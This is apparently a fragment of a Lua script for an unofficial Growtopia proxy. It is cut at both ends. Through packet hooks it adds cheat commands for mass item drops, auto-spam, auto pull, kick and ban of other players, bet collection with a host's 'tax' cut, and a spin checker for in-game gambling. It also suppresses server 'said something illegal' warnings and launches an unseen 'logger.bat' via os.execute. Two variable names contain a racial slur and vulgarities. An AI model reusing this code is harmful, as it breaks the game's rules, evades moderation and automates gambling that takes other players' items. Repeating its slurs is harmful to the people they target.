SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autospam|1")
Sleep(500)
SendPacket(2, "action|input\ntext|/setspam " .. spamtext .. "")
end)
spam = true
end
return true
end
 

if 2 == type and packet:find("/d ") then
d = string.match(packet, "/d (%d+)")
d2 = string.match(packet, "/d " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d)
return true
end
Drop(d)
return true
end
 
if 2 == type and packet:find("/dw ") then
d = string.match(packet, "/dw (%d+)")
d2 = string.match(packet, "/dw " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d)
return true
end
RunThread(function()
if math.floor(GetItemCount(242)) < math.floor(d) then
local packet = {}
packet.type = 10
packet.int_data = 1796
SendPacketRaw(packet)
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|242|\nitem_count|" .. d .. "")
end)
return true
end
 
if 2 == type and packet:find("/dd ") then
d = string.match(packet, "/dd (%d+)")
d2 = string.match(packet, "/dd " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d * 100)
return true
end
RunThread(function()
if math.floor(GetItemCount(1796)) < math.floor(d) then
local packet = {}
packet.type = 10
packet.int_data = 7188
SendPacketRaw(packet)
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|1796|\nitem_count|" .. d .. "")
end)
return true
end
 
if 2 == type and packet:find("/db ") then
d = string.match(packet, "/db (%d+)")
d2 = string.match(packet, "/db " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d * 10000)
return true
end
RunThread(function()
for x = 0, 2 do
if math.floor(GetItemCount(7188)) < math.floor(d) then
SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bluegl")
Sleep(100)
end
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|7188|\nitem_count|" .. d .. "")
end)
CheckLocks()
return true
end
 
if 2 == type and packet:find("/dbb ") then
d = string.match(packet, "/dbb (%d+)")
d2 = string.match(packet, "/dbb " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d * 1000000)
return true
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|11550|\nitem_count|" .. d .. "")
return true
end

if 2 == type and packet:find("/ds ") then
d = string.match(packet, "/ds (%d+)")
d2 = string.match(packet, "/ds " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d * 100)
return true
end
RunThread(function()
if math.floor(GetItemCount(4604)) < math.floor(d) then
local packet = {}
packet.type = 10
packet.int_data = 7188
SendPacketRaw(packet)
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|4604|\nitem_count|" .. d .. "")
end)
return true
end

if 2 == type and packet:find("/dc ") then
d = string.match(packet, "/dc (%d+)")
d2 = string.match(packet, "/dc " .. d .. " (%d+%.?%d*)")
if d2 ~= nil then
d = tonumber(d)  * tonumber(d2)
Drop(d * 100)
return true
end
RunThread(function()
if math.floor(GetItemCount(528)) < math.floor(d) then
local packet = {}
packet.type = 10
packet.int_data = 7188
SendPacketRaw(packet)
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|528|\nitem_count|" .. d .. "")
end)
return true
end

if 2 == type and packet:find("/dg") then
SendPacket(2, "action|dialog_return\ndialog_name|popup\nbuttonClicked|bgem_dropall")
log("you dropped `o250 `bBlack Gems")
return true
end

if 2 == type and packet:find("/bs") then
SendPacket(2, "action|dialog_return\ndialog_name|popup\nbuttonClicked|bgem_suckall")
log("you sucked all `o250 `bBlack Gems")
return true
end
 
if 2 == type and packet:find("/split ") then
d = string.match(packet, "/split (%d+)")
wl1 = GetItemCount(242)
dl1 = GetItemCount(1796)
bgl1 = GetItemCount(7188)
b = (wl1 + dl1 * 100 + bgl1 * 10000)
b = b * d / 100
Drop(b)
return true
end
 
if 2 == type and packet:find("/w1") then
if win > 0 then
x = GetLocal().pos_x/32
y = GetLocal().pos_y/32
FindPath(w1x,w1y)
GetLocal().facing_left = true
if tax ~= 1 then
mok = win * tax / 100
win = win - win * tax / 100
end
RunThread(function()
Sleep(300)
Drop(win)
win = 0
Sleep(1500)
if tx ~= 0 or ty ~= 0 then
Sleep(1500)
if CheckPath(tx + 1,ty) then
FindPath(tx + 1,ty)
GetLocal().facing_left = true
Sleep(500)
Drop(mok)
else
FindPath(tx - 1,ty)
GetLocal().facing_left = false
Sleep(500)
Drop(mok)
end
end
Sleep(1500)
FindPath(x,y)
end)
else
log("`9no previous bet collected")
FChat("`9no previous bet collected")
end
return true
end
 
if 2 == type and packet:find("/ptw") then
log("`9Currently Disabled!")
return true
end

if 2 == type and packet:find("/rcn") then
SendPacket(3,"action|quit")
log("`4Global System Message`o: System Detect You Disconnect")
log("`^Relog Masbro")
SendPacket(3,"action|validate_world\nname|" .. GetLocal().world .. "\n")
return true
end


if 2 == type and packet:find("/taxpos") then
tx = GetLocal().pos_x//32
ty = GetLocal().pos_y//32
log("`9Set!")
return true
end
 
 
if 2 == type and packet:find("/w2") then
if win > 0 then
x = GetLocal().pos_x/32
y = GetLocal().pos_y/32
FindPath(w2x,w2y)
GetLocal().facing_left = false
if tax ~= 1 then
mok = win * tax / 100
win = win - win * tax / 100
end
RunThread(function()
Sleep(300)
Drop(win)
win = 0
 
if tx ~= 0 or ty ~= 0 then
Sleep(1500)
if CheckPath(tx + 1,ty) then
FindPath(tx + 1,ty)
GetLocal().facing_left = true
Sleep(500)
Drop(mok)
else
FindPath(tx - 1,ty)
GetLocal().facing_left = false
Sleep(500)
Drop(mok)
end
end
Sleep(1500)
FindPath(x,y)
end)
else
log("`9no previous bet collected")
end
return true
end
 
if 2 == type and packet:find("/dp ") then
d = string.match(packet, "/dp (%d+)")
RunThread(function()
if math.floor(GetItemCount(7188)) < math.floor(d) then
SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bluegl")
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|bank_deposit\nbgl_count|" .. d .."")
end)
return true
end

if 2 == type and packet:find("/dp") then
RunThread(function()
SendPacket(2,"action|dialog_return\ndialog_name|bank_deposit\nbgl_count|" .. GetItemCount(7188) .."")
Sleep(200)
while GetItemCount(11550) > 0 do
SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bluegl")
Sleep(400)
SendPacket(2,"action|dialog_return\ndialog_name|bank_deposit\nbgl_count|" .. GetItemCount(7188) .."")
Sleep(200)
end
end)
return true
end

 
if 2 == type and packet:find("/wd ") then
d = string.match(packet, "/wd (%d+)")
SendPacket(2,"action|dialog_return\ndialog_name|bank_withdraw\nbgl_count|" .. d .."")
CheckLocks()
return true
end
 
if 2 == type and packet:find("/tax ") then
d = string.match(packet, "/tax (%d+)")
tax = d
log("`9Tax is set to " .. tax .. "%!")
return true
end
 
if 2 == type and packet:find("/mega") then
SendPacket(2,"action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|".. telex .."|\ny|".. teley .."|\nbuttonClicked|megaconvert")
return true
end
 
if 2 == type and packet:find("/s1") then
setgem(1)
return true
end
 
if 2 == type and packet:find("/s2") then
setgem(2)
return true
end
 
if 2 == type and packet:find("/cv") then
SendPacket(2,"action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|".. telex .."|\ny|".. teley .."|\nbuttonClicked|bglconvert")
return true
end 
 
if 2 == type and packet:find("/ws1") then
w1x =  math.floor(GetLocal().pos_x // 32)
w1y = math.floor(GetLocal().pos_y // 32)
 
log("`9Player 1 position set!")
return true
end
 
if 2 == type and packet:find("/ws2") then
w2x =  math.floor(GetLocal().pos_x // 32)
w2y = math.floor(GetLocal().pos_y // 32)
log("`9Player 2 position set!")
return true
end
 
if 2 == type and packet:find("/daw") then
wl1 = GetItemCount(242)
dl1 = GetItemCount(1796)
bgl1 = GetItemCount(7188)
bbgl1 = GetItemCount(11550)
b = (wl1 + dl1 * 100 + bgl1 * 10000 + bbgl1 * 1000000)
Drop(b)
return true
end

   if 2 == type and packet:find("/modal") then
          dls = GetItemCount(1796)
          bgl = GetItemCount(7188)
          blackgem = GetItemCount(11550)
  
          realbgls = blackgem * 100

          deel = dls
  
          modal = bgl + realbgls
  
          realmodal = math.floor(modal)

thedls = math.floor(deel)
  
          SendPacket(2, "action|input\ntext|My modal is: `e"..realmodal.."BGL `wand `c"..thedls.."DLS")
          
          return true
end

if 2 == type and packet:find("/sbtime") then
   TIME_COMMAND = tonumber(packet:match("/sbtime%s+(.*)"))

         SB_TIMER = TIME_COMMAND
         log("`9Time: "..SB_TIMER)
         FChat("`9Time: "..SB_TIMER)

    return true
end


if 2 == type and packet:find("/content") then
        local kontolNiga = packet:match("/content%s+(.*)")
        SuperContent = kontolNiga
        log("`9Content: " .. SuperContent)
FChat("`9Content: " .. SuperContent)
        return true
end


if 2 == type and packet:find("/super") then
        if SuperHour == false then
            SuperHour = true
            StartTime = os.time()
            StopTime = StartTime + SB_TIMER
             SendPacket(2, "action|input\ntext|/sb " .. SuperContent)
        else
            SuperHour = false
            log("`4Auto SB stopped")
            FChat("`4Auto SB stopped")
        end
        return true
end

if 2 == type and packet:find("/afk") then
    me = GetLocal()

SendPacket(2, "action|input\ntext|/nick "..me.name.."[AFK]")
    return true
end

   if 2 == type and packet:find("/gaspull") then
       
        if gaspullshit == false then
            gaspullshit = true
            log("Gas pull `2ENABLED")
            FChat("Gas pull `2ENABLED")
        else

            gaspullshit = false
            log("Gas pull `4DISABLED")
            FChat("Gas pull `4DISABLED")
        end

        return true
end

 
if 2 == type and packet:find("/tp") then
wl1 = countdrop(242, w1x,w1y)
dl1 = countdrop(1796, w1x,w1y)
bgl1 = countdrop(7188, w1x,w1y)
bbgl1 = countdrop(11550, w1x,w1y)
wl2 = countdrop(242, w2x,w2y)
dl2 = countdrop(1796, w2x,w2y)
bgl2 = countdrop(7188, w2x,w2y)
bbgl2 = countdrop(11550, w2x,w2y)

b = (wl1 + dl1 * 100 + bgl1 * 10000 + bbgl1 * 1000000)
 
bb = (wl2 + dl2 * 100 + bgl2 * 10000 + bbgl2 * 1000000)
 
if b == bb then
RunThread(function()
while (countdrop(242, w1x,w1y) + countdrop(242, w2x,w2y)) > 0 do
collect2(242,w1x,w1y)
collect2(242,w2x,w2y)
Sleep(50)
end
while (countdrop(1796, w1x,w1y) + countdrop(1796, w2x,w2y)) > 0 do
collect2(1796,w1x,w1y)
collect2(1796,w2x,w2y)
Sleep(50)
end
while (countdrop(7188, w1x,w1y) + countdrop(7188, w2x,w2y)) > 0 do
collect2(7188,w1x,w1y)
collect2(7188,w2x,w2y)
Sleep(50)
end
while (countdrop(11550, w1x,w1y) + countdrop(11550, w2x,w2y)) > 0 do
collect2(11550,w1x,w1y)
collect2(11550,w2x,w2y)
Sleep(50)
end

text = ""

if bbgl1 > 0 then
text = text .. "`2" .. bbgl1 .." `bBlack Gem locks "
end

if bgl1 > 0 then
text = text .. "`2" .. bgl1 .." `eBlue Gem locks "
end
 
if dl1 > 0 then
text = text .. "`2" .. dl1 .." `cDiamond locks "
end
 
if wl1 > 0 then
text = text .. "`2" .. wl1 .." `9World locks "
end

text = text .. "!"

text = string.gsub(text, " !", "`9!")
SendPacket(2, "action|input\ntext|`w[`^Introvert_7672`w] (wl)`9Bets`2:" .. text .. "(wl)")
text = string.gsub(text, "`b", "")
text = string.gsub(text, "`2", "")
text = string.gsub(text, "`c", "")
text = string.gsub(text, "`e", "")
text = string.gsub(text, "`9", "")
 
local file = io.open("file.txt", "w")
 
file:write("Bets: " .. text)
 
-- Close the file
file:close()
 
win = (wl1 + dl1 * 100 + bgl1 * 10000 + bbgl1 * 1000000) * 2
log(win)
 
end)
else
SendPacket(2, "action|input\ntext|(wl)Bets are not the same!(wl)")
end
 
return true
end

function OnConsoleMessage(text)
    var = {}
    var[0] = "OnConsoleMessage"
    var[1] = text
    var.netid = -1
    SendVarlist(var)
end

function string.removeColors(varlist)
    return varlist:gsub("`.", "")
end

function qq_function(num)
    return num % 10
end

function reme_function(num)
    local sum = 0
    while num > 0 do
      sum = sum + (num % 10)
      num = math.floor(num / 10)
    end
    return sum
end







 
if 2 == type and packet:find("/ap") then
if ap then
ap = false
log("`9Auto Pull `4Disabled!")
else
ap = true
log("`9Auto Pull `^Enabled!")
 
if ak then
ak = false
log("`9Auto Kick `4Disabled!")
end
 
if ab then
ab = false
log("`9Auto Ban `4Disabled!")
end
 
end
return true
end
 
if 2 == type and packet:find("/ak") then
if ak then
ak = false
log("`9Auto Kick `4Disabled!")
else
ak = true
log("`9Auto Kick `^Enabled!")
 
if ap then
ap = false
log("`9Auto Pull `4Disabled!")
end
 
if ab then
ab = false
log("`9Auto Ban `4Disabled!")
end
 
end
return true
end
 
if 2 == type and packet:find("/ab") then
if ab then
ab = false
log("`9Auto Ban `4Disabled!")
else
ab = true
log("`9Auto Ban `^Enabled!")
 
if ak then
ak = false
log("`9Auto Kick `4Disabled!")
end
 
if ap then
ap = false
log("`9Auto Pull `4Disabled!")
end
 
end
return true
end
 
if 2 == type and packet:find("/aw") then
if aw then
aw = false
log("`9Auto Drop to Winner `4Disabled!")
else
aw = true
log("`9Auto Drop to Winner `^Enabled!")
end
return true
end
 
if 2 == type and packet:find("/pc") then
if pc then
pc = false
log("`9Auto Put Chand `4Disabled!")
else
pc = true
log("`9Auto Put Chand `^Enabled!")
end
return true
end
 
if 2 == type and packet:find("/tele") then
for x = 0, 199 do
for y = 0, 199 do
if GetTile(x,y).fg == 3898  then
telex = x
teley = y
end
end
end
 
log("`9Telephone Coordinates Set!")
FChat("`9Telephone Coordinates Set!")
return true
end

 
if 2 == type and packet:find("/ca") then
a,b = 0,0
  for _, obj in pairs(tiles) do
  a = a + countdrop2(112,  math.floor(tonumber(obj['x'])),  math.floor(tonumber(obj['y'])))
end
 
  for _, obj in pairs(tiles2) do
  b = b + countdrop2(112,  math.floor(tonumber(obj['x'])),  math.floor(tonumber(obj['y'])))
end
 
if a > b then
SendPacket(2, "action|input\ntext|(gems)`9" .. a .. "`w[`^WIN`w]-`9" .. b .. "`w[`4LOSE`w](gems)")
end
if a < b then
SendPacket(2, "action|input\ntext|(gems)`9" .. a .. "`w[`4LOSE`w]-`9" .. b .. "`w[`^WIN`w](gems)")
end
if a == b then
SendPacket(2, "action|input\ntext|(gems)`9" .. a .. "`w[`8TIE`w]-`9" .. b .. "`w[`8TIE`w](gems)")
end
 
RunThread(function()
for _, obj in pairs(tiles) do
local x = math.floor(tonumber(obj['x']))
local y = math.floor(tonumber(obj['y']))
collect2(112,x,y)
    end
for _, obj in pairs(tiles2) do
local x = math.floor(tonumber(obj['x']))
local y = math.floor(tonumber(obj['y']))
collect2(112,x,y)
end
 
if pc then
Sleep(500)
for _, obj in pairs(tiles) do
local x = math.floor(tonumber(obj['x']))
local y = math.floor(tonumber(obj['y']))
move(x,y)
Punch(x,y,5640)
Sleep(100)
end
Sleep(500)
for _, obj in pairs(tiles2) do
local x = math.floor(tonumber(obj['x']))
local y = math.floor(tonumber(obj['y']))
move(x,y)
Punch(x,y,5640)
Sleep(100)
end
end
 
if aw and win > 0  then
if a > b then
x = GetLocal().pos_x/32
y = GetLocal().pos_y/32
FindPath(w1x,w1y)
GetLocal().facing_left = true
if tax ~= 1 then
mok = win * tax / 100
win = win - win * tax / 100
end
Sleep(300)
Drop(win)
Sleep(100)
win = 0
 
if tx ~= 0 or ty ~= 0 then
Sleep(1500)
if CheckPath(tx + 1,ty) then
FindPath(tx + 1,ty)
GetLocal().facing_left = true
Sleep(500)
Drop(mok)
else
FindPath(tx - 1,ty)
GetLocal().facing_left = false
Sleep(800)
Drop(mok)
end
end
Sleep(1500)
FindPath(x,y)
SendPacket(2, "action|input\ntext|`w[`^Introvert_7672`w] `9Winner settled!")
return true
end
if a < b then
x = GetLocal().pos_x/32
y = GetLocal().pos_y/32
FindPath(w2x,w2y)
GetLocal().facing_left = false
if tax ~= 1 then
mok = win * tax / 100
win = win - win * tax / 100
end
Sleep(300)
Drop(win)
Sleep(100)
win = 0
 
if tx ~= 0 or ty ~= 0 then
Sleep(1500)
if CheckPath(tx + 1,ty) then
FindPath(tx + 1,ty)
GetLocal().facing_left = true
Sleep(500)
Drop(mok)
else
FindPath(tx - 1,ty)
GetLocal().facing_left = false
Sleep(500)
Drop(mok)
end
end
Sleep(2000)
FindPath(x,y)
SendPacket(2, "action|input\ntext|`w[`^Introvert_7672`w] `9Winner settled!")
return true
end
 
if a == b then
return true
end
end
end)
 
 
return true
end
 
end
 
 
 
function hook2(type, packet)
 
if packet:find('action|wrench\n|netid') then
log("work")
d = string.match(packet, 'action|wrench\n|netid|(%d+)')
if ap then
SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|" .. d .. "|\nbuttonClicked|pull")
SendPacket(2, "action|input\n|text|[`9GASSS SIR!!`w](wl)(nuke)")
return true
end
if ak then
SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|" .. d .. "|\nbuttonClicked|kick")
SendPacket(2, "action|input\n|text|[`4GET OUT OF MY ROOM!!`w](evil)")
return true
end
if ab then
SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|" .. d .. "|\nbuttonClicked|world_ban")
SendPacket(2, "action|input\n|text|[`bBYE LOSER`w!!](tongue)")
return true
end
end
 
if packet:find('action|dialog_return\ndialog_name|colist\nbuttonClicked') then
WD = tonumber(string.match(packet, 'buttonClicked|Remove (%d+)'))
table.remove(collectdd, WD)

str = ""
for _, i in pairs(collectdd) do 
str = str .. "add_button|Remove " .. _ .. "|`9Position " .. _ ..": [" .. i['x'] .. "," .. i['y'] .. "] `4[REMOVE]|noflags|0|0|\n"
end
local var = {}
var[0] = "OnDialogRequest"
var.netid = -1 
 
var[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Introvert Proxy````|left|32|
add_image_button|banner|interface/large/ivertbann.rttex|noflags|||
add_textbox|`9List of Display Boxes Coordinates:|
]] .. str .. [[
add_spacer|small|
end_dialog|colist||Continue|
]]
SendVarlist(var)
return true
end

if packet:find('buttonClicked|updates') then
update()
return true
end

if packet:find('buttonClicked|logger') then
RunThread(function()
os.execute("start logger.bat")
end)
return true
end
 
if packet:find('buttonClicked|main') then
menu()
return true
end
 
if packet:find('buttonClicked|load') then
l()
sl()
return true
end
if packet:find('action|dialog_return\ndialog_name|setspamtext') then
b = string.gsub(packet, "action|dialog_return\ndialog_name|setspamtext", "")
b = string.gsub(b, "\n", "")
b = string.gsub(b, "settext|", "")
spamtext = b
log("`9Successfully set text to: " .. b .. "")
return true
end
 
if packet:find('action|dialog_return\ndialog_name|bro') or packet:find('action|dialog_return\ndialog_name|bro2') then
m = false
 
if packet:find('action|dialog_return\ndialog_name|bro') then
m = true
end
if packet:find('action|dialog_return\ndialog_name|bro2') then
m = false
end
 
if m then
tiles = {}
log("ya")
else
tiles2 = {}
log("no")
end
 
if packet:find("m1|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 2
pos['y'] = GetLocal().pos_y//32 - 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
if packet:find("m2|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 1
pos['y'] = GetLocal().pos_y//32 - 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m3|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32
pos['y'] = GetLocal().pos_y//32 - 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m4|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 1
pos['y'] = GetLocal().pos_y//32 - 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m5|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 2
pos['y'] = GetLocal().pos_y//32 - 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
-- a
 
if packet:find("m6|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 2
pos['y'] = GetLocal().pos_y//32 - 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
if packet:find("m7|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 1
pos['y'] = GetLocal().pos_y//32 - 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m8|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32
pos['y'] = GetLocal().pos_y//32 - 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m9|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 1
pos['y'] = GetLocal().pos_y//32 - 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m10|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 2
pos['y'] = GetLocal().pos_y//32 - 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
-- a
 
if packet:find("m11|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 2
pos['y'] = GetLocal().pos_y//32
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
if packet:find("m12|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 1
pos['y'] = GetLocal().pos_y//32
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m13|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32
pos['y'] = GetLocal().pos_y//32
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m14|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 1
pos['y'] = GetLocal().pos_y//32
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m15|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 2
pos['y'] = GetLocal().pos_y//32
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
-- a
 
if packet:find("m16|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 2
pos['y'] = GetLocal().pos_y//32 + 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
if packet:find("m17|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 1
pos['y'] = GetLocal().pos_y//32 + 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m18|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32
pos['y'] = GetLocal().pos_y//32 + 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m19|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 1
pos['y'] = GetLocal().pos_y//32 + 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m20|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 2
pos['y'] = GetLocal().pos_y//32 + 1
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
-- a
 
if packet:find("m21|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 2
pos['y'] = GetLocal().pos_y//32 + 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
if packet:find("m22|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 - 1
pos['y'] = GetLocal().pos_y//32 + 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m23|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32
pos['y'] = GetLocal().pos_y//32 + 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
 
if packet:find("m24|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 1
pos['y'] = GetLocal().pos_y//32 + 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
 
if packet:find("m25|1") then
local pos = {}
pos['x'] = GetLocal().pos_x//32 + 2
pos['y'] = GetLocal().pos_y//32 + 2
if m then
table.insert(tiles, pos)
else
table.insert(tiles2, pos)
end
end
end
end
 
 
for x = 0, 199 do
if telex ~= -1 or teley ~= -1 then break end
for y = 0, 199 do
if telex ~= -1 or teley ~= -1 then break end
if GetTile(x,y).fg == 3898 and (telex == -1 and teley == -1) then
telex = x
teley = y
end
end
end
 
log("`9Telephone Coordinates Set!")

function logingxd(type, packet)
	if packet:find("action|enter_game") then
       OnConsoleMessage("`0[ `3Introvert_7672 `0] `9Removing game freeze / crash..")
        SendPacket(2, "action|enter_game")
		return true
	end
end
AddCallback("loging", "OnPacket", logingxd)


function check_login(varlist)
    if varlist[0] == "OnConsoleMessage" and varlist[1]:find("Welcome back,") then
        wl_balance = math.floor(GetItemCount(242))
        dl_balance = math.floor(GetItemCount(1796))
        bgl_balance = math.floor(GetItemCount(7188))
        log("`0[ `3Introvert_7672 `0] `9Player Authentication `2Successful.")
       log("`0[ `3Introvert_7672 `0] `9WL : `3"..wl_balance.." `1& `9DL : `3"..dl_balance.." `1& `9BGL : `3"..bgl_balance)
        return true
    end
end
AddCallback("check","OnVarlist", check_login)

 
function CheckLocks()
 RunThread(function()
		Sleep(300)
		 while GetItemCount(242) > 99 do
		local packet = {}
		packet.type = 10
		packet.int_data = 242
		SendPacketRaw(packet)
		Sleep(100)
		end
		while GetItemCount(1796) > 99 do
		 SendPacket(2,"action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|".. telex .."|\ny|".. teley .."|\nbuttonClicked|bglconvert")
		Sleep(100)
		end
		while GetItemCount(7188) > 99 do
		 SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bgl")
		Sleep(100)
		end

		end)
end

 local function ivert(text)
 local packet = {
 [0] = "OnAddNotification",
 [1] = "interface/large/game_on.rttex",
 [2] = text,
 [3] = "audio/lala_theme.wav",
   [4] = 0,
 netid = -1
 }
 SendVarlist(packet)
 end
local function WARN(text)
	local packet = {
		[0] = "OnAddNotification",
		[1] = "interface/atomic_button.rttex",
		[2] = text,
		[3] = 'audio/hub_open.wav',
		[4] = 0,
		netid = -1
	}
	SendVarlist(packet)
end
local function EVENT(text)
	local packet = {
		[0] = "OnAddNotification",
		[1] = "interface/large/special_event.rttex",
		[2] = text,
		[3] = 'audio/gong.wav',
		[4] = 0,
		netid = -1
	}
	SendVarlist(packet)
end

function menuExecute()
WARN("`0[`1S`2T`3A`4R`5T`6I`7N`8G`0] `9Ivert Script Community PROXY")
Sleep(3000)
EVENT("If Feature not work run 2x")
Sleep(2000)
ivert("`^[`wULTIMATE GROWPAI PROXY`^]`cBy `4Introvert_7672")
return true
end

function GasPuller(varlist, packet)
   
	if varlist[0]:find("OnTalkBubble") then

         if varlist[2]:find("gas") or varlist[2]:find("go") or varlist[2]:find("play") then

            local KontolMyAss = varlist[1]
            if gaspullshit == true then
                playerID = KontolMyAss
                SendPacket(2, "action|dialog_return\ndialog_name|popup\nnetID|"..KontolMyAss.."|\nbuttonClicked|pull")
                SendPacket(2, "action|input\n|text|`9Gasss!!(wl)(evil)")
                


            end
            
         end

		
	end
end

AddCallback("GasPull", "OnVarlist", GasPuller)

 
function hook(varlist)
if varlist[0] == "OnConsoleMessage" and varlist[1]:find("said something illegal") then
return true
end
if varlist[0] == "OnDialogRequest" and varlist[1]:find("The Black Backpack") then
return true
end
if varlist[0] == "OnConsoleMessage" and varlist[1]:find("Collected") and (varlist[1]:find("Blue Gem Lock") or varlist[1]:find("World Lock") or varlist[1]:find("Diamond Lock")) then
CheckLocks()
 end
	if varlist[0]:find("OnSDBroadcast") then
	return true
	end
 
    if varlist[0]:find("OnDialogRequest") and varlist[1]:find("end_dialog|telephone") then
       TELEPHONE_X = varlist[1]:match('embed_data|x|(%d+)')
         TELEPHONE_Y = varlist[1]:match('embed_data|y|(%d+)')
         SendPacket(2,"action|dialog_return\ndialog_name|telephone\nnum|53785|\nx|"..TELEPHONE_X.."|\ny|"..TELEPHONE_Y.."|\nbuttonClicked|bglconvert")
        return true
    end
end
 
AddCallback("onvariantlist", "OnVarlist", function(vlist)


function setwarn(type, packet)
   if 2 == type and packet:find("/warn") then
        setwarn_text = packet:gsub("action|input\n|text|/warn", "")
            var2 = {}
            var2[0] = "OnAddNotification"
            var2[1] = "interface/atomic_button.rttex"
            var2[2] = setwarn_text
            var2[3] = "audio/hub_open.wav"
            var2[4] = 0
            var2.netid = -1
            SendVarlist(var2)
            return true
        end
    end
     


function fc(type, packet)
   if 2 == type and packet:find("/fc") then
        OnConsoleMessage("`0[ `3Introvert_7672 `0] `9Closing proxy.")
        RemoveCallbacks()
    return true
    end
end
    

function all_spin(type, packet)
   if 2 == type and packet:find("/sall") then
        OnConsoleMessage("`0[ `3Introvert_7672 `0] `9Spin mode set to `3QQ & REME")

function Spin_checker(varlist)
    if varlist[0] == "OnTalkBubble" and varlist[3] ~= -1 and varlist[2]:find("spun the wheel and got") then
      text = ""
      if varlist[2]:find("CP:") then
        start, final = string.find(varlist[2], "=")
        text = "`0[`4FAKE`0] " .. string.sub(varlist[2], final + 1)
      else
        x = varlist[2]:removeColors()
        x2 = x:match("spun the wheel and got (%d+)")
        x2 = tonumber(x2)
        qq_mode = qq_function(x2)
        reme_mode2 = reme_function(x2)
        reme_mode = qq_function(reme_mode2)
        var = {}
        var[0] = "OnTalkBubble"
        var[1] = varlist[1]
